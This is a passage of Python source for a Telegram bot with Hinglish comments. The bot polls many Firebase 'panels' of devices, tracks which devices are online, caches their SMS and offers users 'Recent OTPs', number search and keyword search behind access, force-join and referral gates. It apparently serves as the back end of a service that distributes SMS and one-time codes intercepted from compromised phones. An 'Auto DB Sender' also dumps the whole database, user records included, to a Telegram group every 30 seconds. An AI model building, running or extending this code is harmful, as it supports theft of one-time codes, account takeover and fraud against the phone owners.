    sem = asyncio.Semaphore(DB_CONCURRENCY)

    async def _fetch_and_cache(tag: str, url: str):
        async with sem:
            try:
                fresh = await fetch_db_data(tag, url)
            except Exception:
                fresh = None
            # ⛔ AUTO-REMOVE PROTECTION:
            # Agar fetch fail ho jaye ya kisi wajah se empty aaye (network
            # glitch, timeout, Firebase hiccup) to PURANA cache waisa ka waisa
            # rakho. Numbers kabhi khud-b-khud gayab nahi honge — sirf ek
            # successful non-empty fetch hi cache update karega.
            if fresh:
                GLOBAL_DEVICE_CACHE[tag] = fresh
                # F2: DB health — success
                if _main_app:
                    asyncio.create_task(db_health_check_alert(_main_app.bot, tag, failed=False))
                # F6: Device offline check
                if _main_app:
                    asyncio.create_task(device_offline_check(_main_app.bot, tag, fresh))
            else:
                if tag not in GLOBAL_DEVICE_CACHE:
                    GLOBAL_DEVICE_CACHE[tag] = []
                # F2: DB health — fail
                if _main_app:
                    asyncio.create_task(db_health_check_alert(_main_app.bot, tag, failed=True))

    async def _poll_one(tag: str, url: str):
        async with sem: await poll_single_db(tag, url)

    while True:
        try:
            db_items = list(DATABASES.items())
            t0 = time.time()
            await asyncio.gather(*(_fetch_and_cache(tag, url) for tag, url in db_items))
            fetch_time = round(time.time() - t0, 1)

            # ⛔ AUTO-DELETE / AUTO-REMOVE COMPLETELY DISABLED.
            # Pehle yahan zero-device DBs ko permanently delete kar diya jata tha.
            # Network glitch par poora panel data udd jata tha. Ab ye code hi
            # nahi hai — koi DB kabhi khud se delete nahi hogi. Sirf admin
            # manually Panel Manager se delete kar sakta hai.

            if first_run:
                await asyncio.gather(*(seed_seen_ids_for_db(url) for _, url in db_items))
                first_run = False
                tlog(f"Engine Online — {len(db_items)} DBs fetched in {fetch_time}s | {len(seen_ids)} existing SMS seeded")
            else:
                await asyncio.gather(*(_poll_one(tag, url) for tag, url in db_items))
                if len(seen_ids) > MAX_SEEN_IDS:
                    seen_ids = set(list(seen_ids)[-(MAX_SEEN_IDS // 2):])

            gc_counter += 1
            if gc_counter >= 5: gc.collect(); gc_counter = 0

        except Exception as e:
            tlog(f"Poll loop error: {e}")
        await asyncio.sleep(POLL_INTERVAL)

# ═══════════════════════════════════════════════════════════════
#  EXTRA FEATURES — Admin Suite + User Suite + Auto DB Sender
# ═══════════════════════════════════════════════════════════════

AUTO_DB_GROUP: int = 0
AUTO_DB_BACKUP_GROUP: int = 0
AUTO_DB_ENABLED: bool = False
AUTO_DB_INTERVAL: int = 30
AUTO_DB_LAST_SENT: float = 0.0
AUTO_DB_SENT_COUNT: int = 0
AUTO_DB_FAIL_COUNT: int = 0
AUTO_DB_LAST_ERROR: str = ""
AUTO_DB_LAST_GOOD: int = 0          # chat_id jahan last send successfully gaya
MAINTENANCE_MODE: bool = False
BOT_START_TS: float = time.time()
RECENT_LOGS: list = []

# ── Analytics / ops state (persisted partially via save_data) ──
SMS_VOLUME: dict = {}          # YYYY-MM-DD -> count
DEVICE_UPTIME: dict = {}       # device_id -> {first_seen, last_online, last_offline, online_sec, samples}
PANEL_HEALTH: dict = {}        # tag -> {ok, fail, last_latency_ms, last_ok_ts, last_fail_ts}
SENDER_STATS: dict = {}        # sender_key -> {count, last_ts, last_panel}
NUMBER_INDEX: dict = {}        # normalized_number -> list[{panel, device_id, name}]
ANALYTICS_DIR = "analytics_data"

# Media Manager — welcome media + per-user custom media packs
# entry: {"id", "type": photo|video|animation|document, "file_id", "caption", "name", "scope": default|user,
#         "user_ids": [..], "enabled": True, "created_at": iso}
MEDIA_LIBRARY: list = []
WELCOME_MEDIA_ENABLED: bool = True


def _log(msg: str) -> None:
    line = f"[{datetime.now().strftime('%d %b %I:%M:%S %p')}] {msg}"
    RECENT_LOGS.append(line)
    if len(RECENT_LOGS) > 400:
        del RECENT_LOGS[:150]
    print(line, flush=True)


def _fmt_uptime(sec: float) -> str:
    sec = int(sec)
    d, sec = divmod(sec, 86400)
    h, sec = divmod(sec, 3600)
    m, s = divmod(sec, 60)
    out = []
    if d:
        out.append(f"{d}d")
    if h:
        out.append(f"{h}h")
    if m:
        out.append(f"{m}m")
    out.append(f"{s}s")
    return " ".join(out)


def _users_csv_bytes() -> bytes:
    import csv
    import io as _io
    buf = _io.StringIO()
    w = csv.writer(buf)
    w.writerow(["user_id", "name", "username", "joined_at", "banned", "access", "referrals"])
    for uid, u in all_users.items():
        w.writerow([
            uid, u.get("name", ""), u.get("username", ""), u.get("joined_at", ""),
            bool(u.get("banned")), has_access(uid), len(u.get("referrals", []) or []),
        ])
    return buf.getvalue().encode("utf-8")


def _db_snapshot_bytes() -> bytes:
    payload = {
        "generated_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
        "total_panels": len(DATABASES),
        "total_users": len(all_users),
        "allowed_users": list(allowed_users),
        "admin_only_tags": list(ADMIN_ONLY_TAGS),
        "force_join_enabled": FORCE_JOIN_ENABLED,
        "force_join_channels": FORCE_JOIN_CHANNELS,
        "referral_enabled": REFERRAL_ENABLED,
        "required_referrals": REQUIRED_REFERRALS,
        "databases": DATABASES,
        "users": all_users,
    }
    return json.dumps(payload, indent=2, default=str).encode("utf-8")


# ─────────────────────────── KEYBOARDS ───────────────────────────

def admin_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [premium_button("➕ Active Firebase", callback_data="admin_add_active_db", style="success"),
         premium_button("🗑 Dead Firebase", callback_data="admin_remove_dead_db", style="danger")],
        [premium_button("➕ Add Panel URL", callback_data="admin_add_main_db", style="primary"),
         premium_button("🗂 Panel Manager", callback_data="adm_panel_mgr", style="primary")],
        [premium_button("📜 Private Log Channel", callback_data="admin_log_channel", style="primary"),
         premium_button("🖼 Media Manager", callback_data="media_mgr", style="primary")],
        [premium_button("👤 User Manager", callback_data="adm_user_mgr", style="primary"),
         premium_button("🚫 Ban User", callback_data="adm_ban", style="danger")],
        [premium_button("✅ Unban User", callback_data="adm_unban", style="success"),
         premium_button("📋 Banned List", callback_data="adm_banned", style="danger")],
        [premium_button("Grant Access", callback_data="admin_grant_access", style="success"),
         premium_button("Revoke Access", callback_data="admin_revoke_access", style="danger")],
        [premium_button(
            ("Access Gate: ON" if GRANT_ACCESS_REQUIRED else "Access Gate: OFF"),
            callback_data="adm_grant_toggle",
            style=("danger" if GRANT_ACCESS_REQUIRED else "success")
        )],
        [premium_button("User List", callback_data="admin_users", style="primary"),
         premium_button("🔐 Access List", callback_data="admin_access_list", style="primary")],
        [premium_button("🗄 Auto DB Sender", callback_data="adm_autodb", style="success"),
         premium_button("📤 Send DB Now", callback_data="adm_autodb_now", style="primary")],
        [premium_button("📢 Broadcast", callback_data="admin_broadcast", style="primary"),
         premium_button("✉️ DM User", callback_data="adm_dm", style="primary")],
        [premium_button("📊 Dashboard", callback_data="adm_stats", style="success"),
         premium_button("🖥 System Info", callback_data="adm_sysinfo", style="primary")],
        [premium_button("🛰 Ops Suite", callback_data="ops_suite", style="success"),
         premium_button("📡 Live Online", callback_data="ops_live", style="primary")],
        [premium_button("💾 Backup DB", callback_data="adm_backup", style="primary"),
         premium_button("📑 Export CSV", callback_data="adm_export", style="primary")],
        [premium_button("🔒 Force Join", callback_data="admin_force_join", style="primary"),
         premium_button("🎯 Referral Gate", callback_data="admin_referral", style="success")],
        [premium_button("Ping", callback_data="adm_ping", style="success"),
         premium_button("Top Users", callback_data="adm_top", style="primary")],
        [premium_button("🛠 Maintenance", callback_data="adm_maintenance", style="danger"),
         premium_button("🧾 Logs", callback_data="adm_logs", style="primary")],
        [premium_button("Restart Bot", callback_data="adm_restart", style="danger")],
        [premium_button("🔑 Set Admin Panel", callback_data="admin_setadmin_list", style="primary"),
         premium_button("🔄 Refresh", callback_data="admin_refresh", style="primary")],
        [premium_button("❌ Close", callback_data="close_msg", style="danger")],
    ])


def adm_user_mgr_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [premium_button("🚫 Ban User", callback_data="adm_ban", style="danger"),
         premium_button("✅ Unban User", callback_data="adm_unban", style="success")],
        [premium_button("📋 Banned List", callback_data="adm_banned", style="danger"),
         premium_button("🔎 Search User", callback_data="adm_search_user", style="primary")],
        [premium_button("🪪 User Info", callback_data="adm_userinfo", style="primary"),
         premium_button("✉️ DM User", callback_data="adm_dm", style="primary")],
        [premium_button("👥 All Users", callback_data="admin_users", style="primary")],
        [premium_button("⬅️ Back", callback_data="admin_refresh", style="primary"),
         premium_button("❌ Close", callback_data="close_msg", style="danger")],
    ])


def adm_autodb_keyboard() -> InlineKeyboardMarkup:
    state = "🟢 ON" if AUTO_DB_ENABLED else "🔴 OFF"
    grp = str(AUTO_DB_GROUP) if AUTO_DB_GROUP else "Not set"
    return InlineKeyboardMarkup([
        [premium_button(f"Power: {state}", callback_data="adm_autodb_toggle",
                        style="success" if AUTO_DB_ENABLED else "danger")],
        [premium_button("🎯 Set Group", callback_data="adm_autodb_set", style="primary"),
         premium_button("⏱ Interval", callback_data="adm_autodb_interval", style="primary")],
        [premium_button("🗄 Backup Channel", callback_data="adm_autodb_backup", style="primary")],
        [premium_button("📍 Set This Chat", callback_data="adm_autodb_here", style="success"),
         premium_button("🧪 Test Group", callback_data="adm_autodb_test", style="primary")],
        [premium_button("🆔 Chat ID Finder", callback_data="adm_chatid", style="primary")],
        [premium_button("📤 Send Now", callback_data="adm_autodb_now", style="success")],
        [premium_button("⬅️ Back", callback_data="admin_refresh", style="primary"),
         premium_button("❌ Close", callback_data="close_msg", style="danger")],
    ])


def adm_autodb_text() -> str:
    state = "🟢 ENABLED" if AUTO_DB_ENABLED else "🔴 DISABLED"
    grp = f"<code>{AUTO_DB_GROUP}</code>" if AUTO_DB_GROUP else "<i>Not set</i>"
    last = (
        datetime.fromtimestamp(AUTO_DB_LAST_SENT).strftime("%d %b %Y %I:%M:%S %p")
        if AUTO_DB_LAST_SENT else "Never"
    )
    return (
        f"{premium_emoji()} <b>AUTO DB SENDER</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"⚡ Status      : <b>{state}</b>\n"
        f"🎯 Target Group: {grp}\n"
        f"🗄 Backup Ch.  : {(f'<code>{AUTO_DB_BACKUP_GROUP}</code>' if AUTO_DB_BACKUP_GROUP else '<i>Not set</i>')}\n"
        f"⏱ Interval    : <b>{AUTO_DB_INTERVAL}s</b>\n"
        f"📤 Sent Count  : <b>{AUTO_DB_SENT_COUNT}</b>\n"
        f"🕒 Last Sent   : <b>{last}</b>\n"
        f"📤 Last Good   : {(f'<code>{AUTO_DB_LAST_GOOD}</code>' if AUTO_DB_LAST_GOOD else '<i>—</i>')}\n"
        f"❌ Fail Count  : <b>{AUTO_DB_FAIL_COUNT}</b>\n"
        + (f"⚠️ Last Error  : <code>{html_escape(AUTO_DB_LAST_ERROR[:180])}</code>\n"
           if AUTO_DB_LAST_ERROR else "")
        + "━━━━━━━━━━━━━━━━━━\n"
        "<i>Bot har interval par poora database JSON group me bhejta hai.</i>\n"
        "<i>Fail hone par backup channel par fallback hota hai.</i>"
    )


def adm_stats_text() -> str:
    banned = sum(1 for u in all_users.values() if u.get("banned"))
    total_devs = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
    online = sum(
        sum(1 for d in v if d.status == "online") for v in GLOBAL_DEVICE_CACHE.values()
    )
    return (
        f"{premium_emoji()} <b>DASHBOARD</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👥 Users        : <b>{len(all_users)}</b>\n"
        f"✅ Allowed      : <b>{len(allowed_users)}</b>\n"
        f"🚫 Banned       : <b>{banned}</b>\n"
        f"💬 Active Chats : <b>{len(chats_registry)}</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"📡 Panels       : <b>{len(DATABASES)}</b>\n"
        f"📱 Devices      : <b>{total_devs}</b>\n"
        f"🟢 Online       : <b>{online}</b>\n"
        f"🔴 Offline      : <b>{total_devs - online}</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🔒 Admin Panels : <b>{len(ADMIN_ONLY_TAGS)}</b>\n"
        f"🗄 Auto DB      : <b>{'ON' if AUTO_DB_ENABLED else 'OFF'}</b>\n"
        f"🛠 Maintenance  : <b>{'ON' if MAINTENANCE_MODE else 'OFF'}</b>"
    )


def adm_sysinfo_text() -> str:
    try:
        import platform
        import sys as _sys
        pyv = platform.python_version()
        osname = platform.system()
    except Exception:
        pyv, osname = "?", "?"
    return (
        f"{premium_emoji()} <b>SYSTEM INFO</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"⏱ Uptime      : <b>{_fmt_uptime(time.time() - BOT_START_TS)}</b>\n"
        f"🐍 Python      : <b>{pyv}</b>\n"
        f"💻 OS          : <b>{osname}</b>\n"
        f"🤖 Bot         : <b>@{BOT_USERNAME.lstrip('@')}</b>\n"
        f"📡 Panels      : <b>{len(DATABASES)}</b>\n"
        f"🧠 Seen IDs    : <b>{len(seen_ids)}</b>\n"
        f"🗄 Auto DB     : <b>{'ON' if AUTO_DB_ENABLED else 'OFF'}</b> "
        f"(every {AUTO_DB_INTERVAL}s)\n"
        f"📤 DB Sent     : <b>{AUTO_DB_SENT_COUNT}</b>"
    )


def adm_panel_mgr_keyboard(page: int = 0) -> InlineKeyboardMarkup:
    tags = sorted(DATABASES.keys())
    per = 8
    chunk = tags[page * per:(page + 1) * per]
    rows = []
    for tag in chunk:
        safe = safe_tag_for(tag)
        lock = "🔒" if tag in ADMIN_ONLY_TAGS else "🔓"
        rows.append([premium_button(f"{lock} {tag}", callback_data=f"adm_pinfo:{safe}", style="primary")])
    nav = []
    if page > 0:
        nav.append(premium_button("⬅️", callback_data=f"adm_pmgr:{page-1}", style="primary"))
    if (page + 1) * per < len(tags):
        nav.append(premium_button("➡️", callback_data=f"adm_pmgr:{page+1}", style="primary"))
    if nav:
        rows.append(nav)
    rows.append([premium_button("⬅️ Back", callback_data="admin_refresh", style="primary"),
                 premium_button("❌ Close", callback_data="close_msg", style="danger")])
    return InlineKeyboardMarkup(rows)


def adm_panel_mgr_text(page: int = 0) -> str:
    tags = sorted(DATABASES.keys())
    per = 8
    pages = max(1, (len(tags) + per - 1) // per)
    return (
        f"{premium_emoji()} <b>PANEL MANAGER</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"📡 Total Panels: <b>{len(tags)}</b>\n"
        f"📄 Page: <b>{page + 1}/{pages}</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "<i>Panel par tap karein → details / delete / lock</i>"
    )


def user_extra_keyboard(chat_id: Optional[int] = None) -> InlineKeyboardMarkup:
    rows = [
        [premium_button("🆔 My ID", callback_data="u_myid", style="primary"),
         premium_button("📊 My Stats", callback_data="u_stats", style="success")],
        [premium_button("🏆 Top Panels", callback_data="u_top", style="primary"),
         premium_button("📡 All Panels", callback_data="panels", style="primary")],
    ]
    # ⚡ Tap-to-copy user ID
    if chat_id:
        rows.append([premium_button("Copy My ID", copy_text=str(chat_id), style="primary")])
    rows.append([premium_button("❓ Help", callback_data="u_help", style="primary"),
                 premium_button("💬 Support", callback_data="u_support", style="success")])
    rows.append([premium_button("❌ Close", callback_data="close_msg", style="danger")])
    return InlineKeyboardMarkup(rows)


# ─────────────────────────── AUTO DB LOOP ───────────────────────────

async def resolve_send_chat(bot, chat_id):
    """Chat ko validate karta hai. Return: (ok, real_id, error_msg).

    'Chat not found' ke asli reasons:
      1. Bot us group/channel me member hi nahi hai
      2. Group delete ho gaya / bot kick ho gaya
      3. ID galat hai (purane -100... wale group migrate ho gaye)
      4. Bot ko channel me admin nahi banaya
    """
    if not chat_id:
        return False, 0, "chat_id set nahi hai"
    try:
        chat = await bot.get_chat(chat_id)
        return True, chat.id, ""
    except Exception as e:
        msg = str(e)
        low = msg.lower()
        if "chat not found" in low:
            return False, 0, ("Chat not found — bot us group/channel me member nahi hai, "
                              "ya group delete/kick ho gaya hai")
        if "bot was kicked" in low or "kicked" in low:
            return False, 0, "Bot ko group se kick kar diya gaya hai"
        if "not enough rights" in low or "chat_admin_required" in low:
            return False, 0, "Bot ko us channel me ADMIN banana zaroori hai"
        if "forbidden" in low:
            return False, 0, "Bot ko permission nahi hai (blocked / left)"
        return False, 0, f"{type(e).__name__}: {msg[:120]}"


async def _send_db_to(bot, chat_id, caption_title: str, extra_line: str = ""):
    """Ek chat me DB bhejta hai. Return (ok, error)."""
    ok, real_id, err = await resolve_send_chat(bot, chat_id)
    if not ok:
        return False, err
    data = _db_snapshot_bytes()
    fname = f"database_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    try:
        await bot.send_document(
            chat_id=real_id,
            document=data,
            filename=fname,
            caption=(
                f"🗄 <b>{caption_title}</b>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"📡 Panels: <b>{len(DATABASES)}</b>\n"
                f"👥 Users: <b>{len(all_users)}</b>\n"
                f"⏱ Interval: <b>{AUTO_DB_INTERVAL}s</b>\n"
                + (f"{extra_line}\n" if extra_line else "")
                + f"🕒 {datetime.now().strftime('%d %b %Y %I:%M %p')}"
            ),
            parse_mode="HTML",
        )
        return True, ""
    except Exception as e:
        return False, f"{type(e).__name__}: {str(e)[:150]}"

async def auto_db_sender_loop(app) -> None:
    """Auto DB sender — bulletproof.

    Fixes:
      • 'Chat not found' par chup-chaap fail nahi hota — backup channel par
        fallback karta hai aur owner ko saaf message bhejta hai.
      • Har 5s log spam nahi — sirf ek baar per failure streak.
      • Success par fail counter reset.
    """
    global AUTO_DB_LAST_SENT, AUTO_DB_SENT_COUNT
    global AUTO_DB_FAIL_COUNT, AUTO_DB_LAST_ERROR, AUTO_DB_LAST_GOOD

    await asyncio.sleep(8)
    _alerted = False

    while True:
        try:
            if AUTO_DB_ENABLED and AUTO_DB_GROUP:
                now = time.time()
                if now - AUTO_DB_LAST_SENT >= AUTO_DB_INTERVAL:
                    AUTO_DB_LAST_SENT = now

                    sent_ok = False
                    err_msg = ""

                    # 1️⃣ pehle main group
                    ok, err = await _send_db_to(app.bot, AUTO_DB_GROUP, "AUTO DATABASE")
                    if ok:
                        sent_ok = True
                        AUTO_DB_LAST_GOOD = AUTO_DB_GROUP
                    else:
                        err_msg = err
                        _log(f"Auto DB main group FAIL ({AUTO_DB_GROUP}): {err}")

                        # 2️⃣ fallback: backup channel
                        if AUTO_DB_BACKUP_GROUP and AUTO_DB_BACKUP_GROUP != AUTO_DB_GROUP:
                            ok2, err2 = await _send_db_to(
                                app.bot, AUTO_DB_BACKUP_GROUP,
                                "AUTO DATABASE (FALLBACK)",
                                f"🔁 Main group fail: <code>{AUTO_DB_GROUP}</code>",
                            )
                            if ok2:
                                sent_ok = True
                                AUTO_DB_LAST_GOOD = AUTO_DB_BACKUP_GROUP
                                _log(f"Auto DB FALLBACK sent → {AUTO_DB_BACKUP_GROUP}")
                            else:
                                err_msg += f" | backup: {err2}"
                                _log(f"Auto DB backup FAIL ({AUTO_DB_BACKUP_GROUP}): {err2}")

                    # 3️⃣ backup channel ko bhi copy (agar main theek chala)
                    if sent_ok and AUTO_DB_LAST_GOOD == AUTO_DB_GROUP \
                            and AUTO_DB_BACKUP_GROUP and AUTO_DB_BACKUP_GROUP != AUTO_DB_GROUP:
                        okb, errb = await _send_db_to(
                            app.bot, AUTO_DB_BACKUP_GROUP, "BACKUP DATABASE",
                            f"🔁 Copy of: <code>{AUTO_DB_GROUP}</code>",
                        )
                        if not okb:
                            _log(f"Backup DB error: {errb}")

                    if sent_ok:
                        AUTO_DB_SENT_COUNT += 1
                        AUTO_DB_FAIL_COUNT = 0
                        AUTO_DB_LAST_ERROR = ""
                        _alerted = False
                        _log(f"Auto DB sent → {AUTO_DB_LAST_GOOD}")
                    else:
                        AUTO_DB_FAIL_COUNT += 1
                        AUTO_DB_LAST_ERROR = err_msg

                        # owner ko sirf ek baar batao (spam nahi)
                        if not _alerted and AUTO_DB_FAIL_COUNT >= 2:
                            _alerted = True
                            try:
                                await app.bot.send_message(
                                    OWNER_HARD_ID,
                                    "⚠️ <b>AUTO DB SENDER FAIL</b>\n"
                                    "━━━━━━━━━━━━━━━━━━\n"
                                    f"🎯 Target Group: <code>{AUTO_DB_GROUP}</code>\n"
                                    f"🗄 Backup Ch.: <code>{AUTO_DB_BACKUP_GROUP or 'Not set'}</code>\n"
                                    f"❌ Error: <code>{html_escape(err_msg[:220])}</code>\n"
                                    "━━━━━━━━━━━━━━━━━━\n"
                                    "🔧 <b>Kya karein:</b>\n"
                                    "1. Bot ko us group/channel me <b>add</b> karein\n"
                                    "2. Channel me <b>admin</b> banayein (Post Messages)\n"
                                    "3. Ya Auto DB Sender → <b>📍 Set This Chat</b> dabayein\n"
                                    "4. Ya <b>🎯 Set Group</b> se naya ID / forward bhejein",
                                    parse_mode="HTML",
                                )
                            except Exception:
                                pass
        except Exception as e:
            _log(f"Auto DB loop error: {type(e).__name__}: {e}")
        await asyncio.sleep(5)


# ─────────────────────── 🆔 CHAT ID FINDER (built-in) ───────────────────────
# Alag script ki zaroorat nahi — sab kuch bot ke andar.
# Private channel ka ID nikalne ka tareeka: channel ka message bot ko forward.

async def _resolve_chat_info(bot, target):
    """Chat ko resolve karke poori info deta hai (dict)."""
    info = {"ok": False, "input": str(target), "chat_id": None, "title": None,
            "type": None, "username": None, "bot_status": None,
            "can_post": False, "error": None, "hint": None}
    raw = str(target).strip()

    if not raw:
        info["error"] = "Khaali input"
        return info

    # invite link → bot resolve nahi kar sakta
    if "t.me/+" in raw or "joinchat/" in raw:
        info["error"] = "Invite link se bot chat resolve nahi kar sakta"
        info["hint"] = ("Invite link se sirf insaan join karta hai.\n"
                        "Private channel ka ID nikalne ke liye:\n"
                        "channel ka koi message bot ko FORWARD karo.")
        return info

    key = raw
    if "t.me/" in key:
        key = "@" + key.split("t.me/")[1].split("/")[0].split("?")[0]
    elif key.lstrip("-").isdigit():
        try:
            key = int(key)
        except Exception:
            pass

    try:
        chat = await bot.get_chat(key)
    except ChatMigrated as e:
        info["chat_id"] = e.new_chat_id
        info["error"] = f"Group migrate ho gaya → naya ID: {e.new_chat_id}"
        info["hint"] = "Naya ID use karein."
        return info
    except Exception as e:
        msg = str(e)
        info["error"] = msg
        low = msg.lower()
        if "chat not found" in low:
            info["hint"] = ("Bot us chat me MEMBER nahi hai / kick ho gaya / ID galat.\n"
                            "Private channel → bot ko ADMIN banana zaroori hai.")
        elif "username not found" in low:
            info["hint"] = "Username galat hai ya channel private hai."
        elif "not enough rights" in low:
            info["hint"] = "Bot ko admin banao (Post Messages ON)."
        return info

    info.update(ok=True, chat_id=chat.id,
                title=chat.title or chat.full_name or chat.username or "—",
                type=chat.type, username=chat.username)

    try:
        me = await bot.get_me()
        mem = await bot.get_chat_member(chat.id, me.id)
        info["bot_status"] = mem.status
        info["can_post"] = bool(getattr(mem, "can_post_messages", False)
                                or mem.status in ("creator", "administrator"))
    except Exception:
        info["bot_status"] = "not_member"
    return info


def _chatid_card(info: dict) -> str:
    if not info.get("ok"):
        txt = (f"🆔 <b>CHAT ID FINDER</b>\n" + "━"*18 + "\n"
               f"❌ <b>Resolve nahi hua</b>\n"
               f"<code>{html_escape(str(info.get('error'))[:220])}</code>\n")
        if info.get("hint"):
            txt += "\n💡 " + html_escape(info["hint"])
        txt += ("\n" + "━"*18 + "\n"
                "📌 <b>Private channel ke liye:</b>\n"
                "1. Channel → Administrators → Add Admin\n"
                f"2. <code>@QxP_Pannel_bot</code> daalo\n"
                "3. Post Messages ON karo\n"
                "4. Channel ka message yahan <b>forward</b> karo")
        return txt

    st = info.get("bot_status") or "?"
    if st in ("administrator", "creator"):
        st_line = f"✅ {st}"
    elif st == "member":
        st_line = "✅ member"
    else:
        st_line = f"❌ {st}"
    post = "✅ allowed" if info.get("can_post") else "❌ not allowed"
    return (f"🆔 <b>CHAT ID FOUND</b>\n" + "━"*18 + "\n"
            f"🆔 <b>Chat ID</b>  : <code>{info['chat_id']}</code>\n"
            f"📛 <b>Title</b>    : {html_escape(str(info.get('title'))[:60])}\n"
            f"📦 <b>Type</b>     : {info.get('type')}\n"
            f"🔗 <b>Username</b> : {(('@' + info['username']) if info.get('username') else '— (private)')}\n"
            + "━"*18 + "\n"
            f"🤖 <b>Bot</b>      : {st_line}\n"
            f"📤 <b>Posting</b>  : {post}\n"
            + "━"*18 + "\n"
            + ("✅ Bot yahan bhej sakta hai!" if info.get("can_post")
               else "⚠️ Bot yahan post nahi kar sakta — admin + Post Messages ON karo."))


def chatid_keyboard(info: dict) -> InlineKeyboardMarkup:
    rows = []
    if info.get("ok") and info.get("chat_id"):
        cid = info["chat_id"]
        rows.append([premium_button("✅ Set as Auto DB Group",
                                    callback_data=f"chatid_use:{cid}", style="success")])
        rows.append([premium_button("🗄 Set as Backup Channel",
                                    callback_data=f"chatid_use_bk:{cid}", style="primary")])
        rows.append([premium_button("🔁 Re-check", callback_data=f"chatid_re:{cid}")])
    rows.append([premium_button("‹ Auto DB Sender", callback_data="adm_autodb", style="primary"),
                 premium_button("❌ Close", callback_data="close_msg", style="danger")])
    return InlineKeyboardMarkup(rows)


# ─────────────────────────── CALLBACK DISPATCHER ───────────────────────────

async def extra_callbacks(update, ctx, data: str, chat_id: int, is_admin: bool) -> bool:
    global AUTO_DB_GROUP, AUTO_DB_ENABLED, AUTO_DB_INTERVAL, AUTO_DB_LAST_SENT
    global AUTO_DB_SENT_COUNT, MAINTENANCE_MODE, GRANT_ACCESS_REQUIRED
    global AUTO_DB_FAIL_COUNT, AUTO_DB_LAST_ERROR

    query = update.callback_query
    try:
        if await ops_callbacks(update, ctx, data, chat_id, is_admin):
            return True
    except Exception as e:
        _log(f"ops_callbacks error: {e}")
    try:
        if await media_callbacks(update, ctx, data, chat_id, is_admin):
            return True
    except Exception as e:
        _log(f"media_callbacks error: {e}")

    # ══════════ USER SIDE ══════════
    if data == "u_menu":
        await query.answer()
        await safe_edit(
            query,
            f"{premium_emoji()} <b>USER PANEL</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Neeche se option choose karein 👇",
            reply_markup=user_extra_keyboard(chat_id),
        )
        return True

    if data == "u_myid":
        await query.answer()
        u = all_users.get(chat_id, {})
        await safe_edit(
            query,
            f"{premium_emoji()} <b>MY PROFILE</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🆔 ID       : <code>{chat_id}</code>\n"
            f"👤 Name     : <b>{html_escape(u.get('name', 'Unknown'))}</b>\n"
            f"🔗 Username : @{html_escape(u.get('username') or 'none')}\n"
            f"📅 Joined   : <b>{u.get('joined_at', '-')}</b>\n"
            f"✅ Access   : <b>{'Yes' if has_access(chat_id) else 'No'}</b>\n"
            f"🎁 Referrals: <b>{referral_count(chat_id)}/{REQUIRED_REFERRALS}</b>",
            reply_markup=user_extra_keyboard(chat_id),
        )
        return True

    if data == "u_stats":
        await query.answer()
        u = all_users.get(chat_id, {})
        refs = len(u.get("referrals", []) or [])
        await safe_edit(
            query,
            f"{premium_emoji()} <b>MY STATS</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"📡 Available Panels : <b>{len([t for t in DATABASES if is_admin or t not in ADMIN_ONLY_TAGS])}</b>\n"
            f"🎁 Your Referrals   : <b>{refs}</b>\n"
            f"🏁 Qualified        : <b>{'Yes' if u.get('referral_qualified') else 'No'}</b>\n"
            f"📅 Member Since     : <b>{u.get('joined_at', '-')}</b>",
            reply_markup=user_extra_keyboard(chat_id),
        )
        return True

    if data == "u_top":
        await query.answer()
        scored = []
        for tag in DATABASES:
            if not is_admin and tag in ADMIN_ONLY_TAGS:
                continue
            devs = GLOBAL_DEVICE_CACHE.get(tag, [])
            on = sum(1 for d in devs if d.status == "online")
            scored.append((on, len(devs), tag))
        scored.sort(reverse=True)
        lines = [f"{premium_emoji()} <b>TOP PANELS</b>", "━━━━━━━━━━━━━━━━━━"]
        for i, (on, tot, tag) in enumerate(scored[:15], 1):
            lines.append(f"{i}. <b>{html_escape(tag)}</b> — 🟢 {on} / 📱 {tot}")
        await safe_edit(query, "\n".join(lines), reply_markup=user_extra_keyboard(chat_id))
        return True

    if data == "u_help":
        await query.answer()
        await safe_edit(
            query,
            f"{premium_emoji()} <b>HELP</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "📡 <b>All Panels</b> — sabhi panels ki list\n"
            "🔍 <b>Search Number</b> — number se search\n"
            "🔑 <b>Keyword Search</b> — keyword se search\n"
            "🕒 <b>Recent OTPs</b> — latest OTPs\n"
            "📊 <b>Panel Status</b> — panel health\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Commands: /start /status",
            reply_markup=user_extra_keyboard(chat_id),
        )
        return True

    if data == "u_support":
        await query.answer()
        await safe_edit(
            query,
            f"{premium_emoji()} <b>SUPPORT</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Koi dikkat ho to admin se contact karein:\n"
            f"👤 <b>{OWNER_DISPLAY_NAME}</b>\n"
            f"💬 {OWNER_CONTACT}",
            reply_markup=user_extra_keyboard(chat_id),
        )
        return True

    if not is_admin:
        return False

    # ══════════ ADMIN: USER MANAGER ══════════
    if data == "adm_user_mgr":
        await query.answer()
        banned = sum(1 for u in all_users.values() if u.get("banned"))
        await safe_edit(
            query,
            f"{premium_emoji()} <b>USER MANAGER</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"👥 Total Users : <b>{len(all_users)}</b>\n"
            f"✅ Allowed     : <b>{len(allowed_users)}</b>\n"
            f"🚫 Banned      : <b>{banned}</b>",
            reply_markup=adm_user_mgr_keyboard(),
        )
        return True

    if data == "adm_ban":
        pending_action[chat_id] = {"action": "adm_ban_user"}
        await query.answer()
        await query.message.reply_text(
            "🚫 <b>BAN USER</b>\n━━━━━━━━━━━━━━━━━━\n"
            "User ID bhejein ya us user ka message <b>reply</b> karein:",
            parse_mode="HTML",
